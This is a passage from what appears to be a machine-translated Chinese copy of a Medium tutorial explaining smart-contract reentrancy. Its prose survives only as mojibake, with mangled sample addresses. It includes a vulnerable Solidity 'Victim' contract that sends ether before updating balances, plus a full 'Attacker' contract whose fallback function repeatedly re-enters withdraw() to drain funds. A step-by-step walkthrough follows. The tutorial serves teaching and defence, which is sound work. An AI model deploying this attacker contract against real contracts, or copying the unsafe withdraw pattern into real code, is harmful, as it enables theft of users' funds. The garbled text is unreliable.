# è®©æˆ‘ä»¬é‡æ–°åˆ†æä¸€ä¸‹â€”â€”è€—è´¹æ•°ç™¾ä¸‡ç¾å…ƒçš„æ™ºèƒ½åˆçº¦æ¼æ´ã€‚

> åŸæ–‡ï¼š<https://medium.com/coinmonks/lets-break-down-re-entrancy-the-smart-contract-vulnerability-that-costed-millions-794870313e27?source=collection_archive---------15----------------------->

![](img/381c718789ef349615840a99d0ea1053.png)

æ™ºèƒ½åˆçº¦æ¼æ´å¯ä¸æ˜¯é—¹ç€ç©çš„ã€‚ä¸æ™®é€šçš„è®¡ç®—æœºç¨‹åºä¸åŒï¼Œå®ƒä»¬éœ€è¦çœŸé‡‘ç™½é“¶ã€‚æ˜¯å•Šï¼Œæ²¡é”™ï¼æˆ‘ç»å¸¸å°†æ™ºèƒ½åˆåŒéƒ¨ç½²ä¸ç«ç®­å‘å°„è”ç³»åœ¨ä¸€èµ·ï¼Œç«ç®­å‘å°„éœ€è¦åœ¨éƒ¨ç½²å‰è¿›è¡Œå¯†é›†çš„æ•…éšœæµ‹è¯•ï¼Œä¸€æ—¦å‘å°„ï¼Œå°±æ— æ³•æ”¶å›ï¼

è®¸å¤šæ¼æ´ä¼šå›°æ‰°æ™ºèƒ½åˆçº¦â€”â€”é‡å…¥å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚æˆ‘å°†ä½¿ç”¨ Solidity ä»£ç (è¿™ç§è¯­è¨€å¯¹ä½ ä»¬ä¸­çš„ä¸€äº›äººæ¥è¯´å¯èƒ½æ˜¯æ–°çš„ï¼Œå› æ­¤æˆ‘ä¹Ÿæ·»åŠ äº†ä¸€ä¸ªè§£é‡Š)æ¥è§£é‡Šæ”»å‡»ï¼Œä»¥é¿å…å‘ä½ ä»¬æŠ›å‡ºæŠ½è±¡çš„æ¦‚å¿µã€‚ä¸å®¢æ°”ğŸ™ˆã€‚

# ä»€ä¹ˆæ˜¯å†å…¥æ”»å‡»ï¼Ÿ

æ™ºèƒ½åˆçº¦çš„ä¸€ä¸ªä»¤äººæƒŠè®¶çš„ç‰¹æ€§æ˜¯ï¼Œå®ƒä»¬å¯ä»¥é€šè¿‡è°ƒç”¨å…¶ä»–åˆçº¦çš„åŠŸèƒ½æ¥ç›¸äº’â€œäº¤è°ˆâ€ã€‚ä»–ä»¬ä¹Ÿå¯ä»¥â€œå­˜å‚¨â€å’Œå‘é€*ä¹™é†š*åˆ°ä¸åŒçš„å¤–éƒ¨åœ°å€ã€‚**è¿™äº›æ“ä½œéœ€è¦åˆåŒæäº¤** [**å¤–éƒ¨è°ƒç”¨**](https://consensys.github.io/smart-contract-best-practices/development-recommendations/general/external-calls/) **ã€‚**

è¿™äº›ä¼ å‡ºçš„è°ƒç”¨å¯èƒ½è¢«æ”»å‡»è€…åŠ«æŒï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŸä¸ªå…¶ä»–å¥‘çº¦ä¸­çš„[å›é€€å‡½æ•°](https://www.tutorialspoint.com/solidity/solidity_fallback_function.htm)æ¥å¼ºåˆ¶å¥‘çº¦åšâ€œé¢å¤–çš„å·¥ä½œâ€ã€‚

è®©æˆ‘ä»¬æ¥åˆ†è§£ä¸€ä¸‹â€”

1.  æ”»å‡»è€…å¯ä»¥å¼€å‘ä¸€ä¸ªåŒ…å«å›é€€å‡½æ•°ä¸­ä¸€äº›é‚ªæ¶ä»£ç è¡Œçš„å¥‘çº¦ã€‚
2.  æ¯å½“ä¸€ä¸ªå¥‘çº¦å‘é€*ä»¥å¤ª*åˆ°è¿™ä¸ªå¥‘çº¦çš„åœ°å€ï¼Œå®ƒè°ƒç”¨å›é€€å‡½æ•°ã€‚
3.  å¹¶ä¸”å½“æ¶æ„ä»£ç è¿è¡Œæ—¶ï¼Œå®ƒé€šå¸¸æ‰§è¡Œâ€œè°ƒç”¨â€æˆ–æ˜“å—æ”»å‡»çš„å¥‘çº¦çš„åŠŸèƒ½ã€‚

â€œé‡å…¥â€è¿™ä¸ªåå­—æ¥æºäºè¿™æ ·ä¸€ä¸ªæƒ³æ³•â€”â€”å¤–éƒ¨æ¶æ„ä»£ç è¿«ä½¿æ˜“å—æ”»å‡»çš„å¥‘çº¦é‡å¤æ‰§è¡Œä¸€ä¸ªå‡½æ•°ï¼Œæˆ–è€…å¯¼è‡´ä»£ç æ‰§è¡Œçš„è·¯å¾„â€œé‡å…¥â€åŒä¸€ä¸ªå‡½æ•°ã€‚

æˆ‘å°†é€šè¿‡ä¸€ä¸ªå®é™…çš„ä¾‹å­æ¥å¸®åŠ©æ‚¨ç†è§£å®‰å…¨å¨èƒã€‚

# è®©æˆ‘ä»¬è§è¯ä¸€æ¬¡å†å…¥æ”»å‡»ï¼

## å—å®³è€…åˆåŒ

å—å®³åˆåŒå…è®¸ç”¨æˆ·å­˜å–*ä¹™é†š*å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚

```
pragma solidity ^0.8.4;contract Victim { mapping(address => uint256) balances; function deposit() public payable { balances[msg.sender] += msg.value; } function withdraw(uint _amount) public { require(_amount <= balances[msg.sender],"Insufficient balance"); (bool success,) = msg.sender.call{value:_amount}(""); require(success, "Transfer failed."); balances[msg.sender] -= _amount; } function contractBalance() public view returns(uint256){ return address(this).balance; }}
```

å¦‚æœä½ çŸ¥é“ä¸Šé¢å‘ç”Ÿäº†ä»€ä¹ˆï¼Œå¤ªå¥½äº†ï¼ğŸ˜„è¯·éšæ„è·³åˆ°*æ”»å‡»è€…*éƒ¨åˆ†ã€‚

## **æ˜ å°„(åœ°å€= > uint256)**

è¯¥æ˜ å°„è·Ÿè¸ªç”¨æˆ·çš„å¹³è¡¡ã€‚

```
mapping(address => uint256) balances;
```

ä¾‹å¦‚ï¼Œ

{ " 0 xef 43299 ed 551 e 1 DFB c 7 febddc 36 ea 78 EB 7936 b 73 ":300000000000000ï¼Œ" 0 xe G1 a6 e 16 e 1837 F2 DFD 26 cc 0 f 72d 5b 8 fbace 295 ":100000000000000ï¼Œâ€¦ }

*æ³¨:ä¹™é†šä»¥å«è¡¨ç¤º(1 ä¹™é†š= 10 å«)ã€‚*

## å­˜æ¬¾()

å­˜æ¬¾åŠŸèƒ½ä¼šå¢åŠ æ±‡æ¬¾äººçš„ä½™é¢ã€‚

```
function deposit() public payable { balances[msg.sender] += msg.value;}
```

*æ³¨æ„:å­˜æ¬¾åŠŸèƒ½è¢«å£°æ˜ä¸º payableï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥æ¥å—ä¹™é†šã€‚*

## æå–(_ é‡‘é¢)

å–æ¬¾åŠŸèƒ½é¦–å…ˆç¡®å®šå‘é€è€…æ˜¯å¦æœ‰è¶³å¤Ÿçš„ä½™é¢æ¥æå–æ‰€éœ€çš„*ä¹™é†š* (_amount)ã€‚

```
require(_amount <= balances[msg.sender],"Insufficient balance");
```

ç°åœ¨ï¼ŒåˆåŒå‘é€*ä¹™é†š* (_amount)åˆ°å‘¼å«è€…çš„åœ°å€â€”â€”ä¸€ä¸ªå¤–çº¿ç”µè¯ï¼è¿™æ˜¯è¢­å‡»å‘ç”Ÿçš„åœ°æ–¹ğŸ˜ˆã€‚

```
(bool success,) = msg.sender.call{value:_amount}("");
```

å¦‚æœå‰é¢çš„äº‹åŠ¡å¤±è´¥ï¼Œä¸‹é¢çš„ require è¯­å¥å°†æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚å¦‚æœæ²¡æœ‰ï¼Œç”¨æˆ·ä½™é¢å°†ç›¸åº”å‡å°‘ã€‚

```
require(success, "Transfer failed.");balances[msg.sender] -= _amount;
```

# è¢­å‡»è€…

æ”»å‡»è€…å¥‘çº¦å°†é€šè¿‡å®šä¹‰ä¸€ä¸ªå›é€€å‡½æ•°æ¥åˆ©ç”¨å—å®³è€…å¥‘çº¦ï¼Œä½¿å—å®³è€…åšä¸€äº›â€œé¢å¤–çš„å·¥ä½œâ€ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚

```
// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import "./Victim.sol";contract Attacker { Victim public victim; constructor(address _victim) { victim = Victim(_victim); } function attack() public payable{ require(msg.value >= 1 ether); victim.deposit{value:1 ether}(); victim.withdraw(1 ether); } function contractBalance() public view returns(uint256){ return address(this).balance; } fallback() external payable { if(address(victim).balance > msg.value){ victim.withdraw(1 ether);
        } }}
```

æˆ‘ä¼šåœ¨è§£é‡Šæ”»å‡»çš„åŒæ—¶è§£é‡Šä»£ç ã€‚å¼€å§‹äº†ã€‚

## è¢­å‡»

æ”»å‡»è€…ä¼šç”¨ä¸€äº›å¤§äºæˆ–ç­‰äº 1 çš„*é†š*æ¥è°ƒç”¨æ”»å‡»å‡½æ•°ã€‚è®©æˆ‘ä»¬å‡è®¾è®¸å¤šç”¨æˆ·å·²ç»å°†*ä¹™é†š*å­˜å…¥å—å®³è€…åˆåŒï¼Œå¹¶ä¸”å®ƒçš„å½“å‰ä½™é¢æ˜¯ 5 *ä¹™é†š*ã€‚

```
1.1 function attack() public payable {1.2require(msg.value >= 1 ether);1.3     victim.deposit{value:1 ether}();1.4     victim.withdraw(1 ether);1.5 }
```

åé€€æ˜¯å½“å¥‘çº¦æ¥æ”¶åˆ°ä¸ä¸“ç”¨äºä»»ä½•å‡½æ•°çš„äº‹åŠ¡æ—¶è°ƒç”¨çš„ç‰¹æ®Šå‡½æ•°ï¼ŒåŒ…å«æ™®é€šä»¥å¤ªç½‘å’Œæ— æ•°æ®ã€‚

```
2.1 fallback() external payable {2.2     if(address(victim).balance > msg.value){2.3          victim.withdraw(1 ether);2.4     }2.5 }
```

æ¥ä¸‹æ¥ä¼šå‘ç”Ÿä»€ä¹ˆ(é‡è¦çš„æ˜¯æ¯ä¸€ç‚¹å¯¹ä½ éƒ½æœ‰æ„ä¹‰ã€‚æ¯å½“ä½ æ„Ÿåˆ°å¤±è½çš„æ—¶å€™å°±å»æŸ¥ä»£ç )â€”

1.  *è¡Œ 1.3:*a*ttack å‡½æ•°*ç”¨ 1 ä¹™é†šçš„ msg.value å’Œå¤§é‡æ°”ä½“è°ƒç”¨å—å®³è€…å¥‘çº¦çš„ *deposit å‡½æ•°*ã€‚
2.  *ç¬¬ 1.4 è¡Œ:*æ”»å‡»å‡½æ•°è°ƒç”¨å—å®³è€…å¥‘çº¦çš„*æ’¤é”€å‡½æ•°*ï¼Œå‚æ•°ä¸º 1 *ä»¥å¤ª*ï¼Œå—å®³è€…å°†å‘é€ 1 *ä»¥å¤ª*ç»™æ”»å‡»è€…(*è®°ä½å—å®³è€…å¥‘çº¦ä¸­çš„å¤–éƒ¨è°ƒç”¨ï¼*)ã€‚
3.  *ç¬¬ 2.1 è¡Œ:*å¯¹æ¶æ„åˆåŒçš„ä»˜æ¬¾å°†è°ƒç”¨*å›é€€åŠŸèƒ½*ã€‚
4.  *ç¬¬ 2.2 è¡Œ:*å—å®³è€…å¥‘çº¦ä½™é¢ä¸º 4 *ä¹™é†š*(å°† 1 ä¹™é†šå‘é€ç»™æ”»å‡»è€…å)ï¼Œæ‰€ä»¥*å¦‚æœ*æ¡ä»¶é€šè¿‡ã€‚
5.  *ç¬¬ 2.3 è¡Œ:**å›é€€å‡½æ•°*å†æ¬¡è°ƒç”¨æ’¤é”€å‡½æ•°ï¼Œå°†å—å®³è€…å¥‘çº¦â€˜é‡å…¥â€™(å¦‚ä¸Šå›¾)ã€‚
6.  åœ¨ç¬¬äºŒæ¬¡é€šè¯ä¸­ï¼Œå‘¼å«è€…çš„ä½™é¢ä»ç„¶æ˜¯ 1 *ä¹™é†š*(æˆ‘ä»¬è¿˜æ²¡æœ‰ç§»åŠ¨åˆ°å¤–éƒ¨é€šè¯çº¿è·¯çš„å‰é¢ï¼)ï¼Œæ‰€ä»¥ require è¯­å¥é€šè¿‡ã€‚
7.  *ç¬¬ 2.1â€“2.3 è¡Œ:*å—å®³è€…å†æ¬¡å‘é€ 1 *ä¹™é†š*ç»™æ”»å‡»è€…ï¼Œå›é€€å‡½æ•°å†æ¬¡è°ƒç”¨æ’¤é”€å‡½æ•°â€¦

8.æ­¥éª¤ 3â€“7 é‡å¤**ç›´åˆ°** *åœ°å€(å—å®³è€…)ã€‚å¤©å¹³> 1ã€‚*

å½“è®¿é—®è€…å¥‘çº¦ä¸­åªå‰©ä¸‹ 1 ä¸ª*ä¹™é†š*æ—¶ï¼Œå›é€€å‡½æ•°ä¸­çš„ *if* è¯­å¥å°†å¤±è´¥ã€‚

**ç»“æœ:æ”»å‡»è€…åœ¨ä¸€æ¬¡äº¤æ˜“ä¸­çªƒå–äº†è®¿é—®è€…å¥‘çº¦ä¸­é™¤ 1 ä¸ª*ä¹™é†š*ä¹‹å¤–çš„æ‰€æœ‰ä¹™é†šã€‚**

å¦‚æœè¿™äº›è®©ä½ å›°æƒ‘ï¼Œæˆ‘å»ºè®®ä½ [åœ¨ remix IDE](https://remix.ethereum.org/) ä¸Šè¿è¡Œä»£ç ï¼Œäº²è‡ªè§‚å¯Ÿæ”»å‡»ã€‚

![](img/c5b6ad64aee36bd281b6276aa66c0bfb.png)

A EtherScan record of internal transactions of the attack on the victim contract.

é‚£å°±æ˜¯å¯é‡å…¥ï¼âœ…

åœ¨å¦ä¸€ç¯‡åšå®¢ä¸­ï¼Œæˆ‘å°†è§£é‡Šå¯¹æŠ—æ”»å‡»çš„é¢„é˜²æŠ€æœ¯ã€‚

æˆ‘å¸Œæœ›è¿™ç¯‡åšå®¢å¯¹ä½ æœ‰æ‰€å¸®åŠ©ã€‚å¦‚æœæœ‰ä»»ä½•ä¸æ­£ç¡®çš„ä¿¡æ¯ï¼Œä¸è¦çŠ¹è±«å‘è¡¨è¯„è®ºã€‚

è°¢è°¢ä½ çš„æ—¶é—´ğŸ™Œã€‚

> åŠ å…¥ Coinmonks [ç”µæŠ¥é¢‘é“](https://t.me/coincodecap)å’Œ [Youtube é¢‘é“](https://www.youtube.com/c/coinmonks/videos)äº†è§£åŠ å¯†äº¤æ˜“å’ŒæŠ•èµ„

# å¦å¤–ï¼Œé˜…è¯»

*   [æœ€ä½³ä»¥å¤ªåŠé’±åŒ…](https://coincodecap.com/best-ethereum-wallets) | [ç”µæŠ¥ä¸Šçš„åŠ å¯†è´§å¸æœºå™¨äºº](https://coincodecap.com/telegram-crypto-bots)
*   [äº¤æ˜“æ æ†ä»£å¸çš„æœ€ä½³äº¤æ˜“æ‰€](https://coincodecap.com/leveraged-token-exchanges) | [è´­ä¹° Floki](https://coincodecap.com/buy-floki-inu-token)
*   [3 commas vs . Pionex vs . crypto hopper](https://coincodecap.com/3commas-vs-pionex-vs-cryptohopper)|[Bingbon Review](https://coincodecap.com/bingbon-review)
*   [åŠ å¯†å¤åˆ¶äº¤æ˜“å¹³å°](/coinmonks/top-10-crypto-copy-trading-platforms-for-beginners-d0c37c7d698c) | [å¦‚ä½•åœ¨ WazirX](/coinmonks/buy-bitcoin-on-wazirx-2d12b7989af1) ä¸Šè´­ä¹°æ¯”ç‰¹å¸
*   [ç¡¬å¸è¯„è®º](https://coincodecap.com/coinloan-review)|[Crypto.com è¯„è®º](/coinmonks/crypto-com-review-f143dca1f74c)
*   [å¦‚ä½•åœ¨åŠ æ‹¿å¤§è´­ä¹°åŠ å¯†è´§å¸ï¼Ÿ](https://coincodecap.com/how-to-buy-cryptocurrency-in-canada)